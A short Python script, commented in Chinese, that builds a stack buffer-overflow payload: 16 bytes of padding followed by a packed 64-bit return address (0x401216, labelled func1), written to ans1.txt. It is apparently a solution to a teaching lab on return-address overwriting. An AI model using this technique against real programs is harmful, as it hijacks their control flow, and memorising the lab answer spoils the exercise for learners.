import struct

#构造 Padding
#从rbp-8到rbp+8之间共有16个字节
padding = b'A' * 16

#构造目标地址
#func1：0x401216
#打包成 64位小端序
target_addr = struct.pack('<Q', 0x401216)

#拼接Payload
payload = padding + target_addr

#写入文件
with open("ans1.txt", "wb") as f:
    f.write(payload)

print(f"Payload generated! Size: {len(payload)} bytes.")
print(f"Content: {payload}")
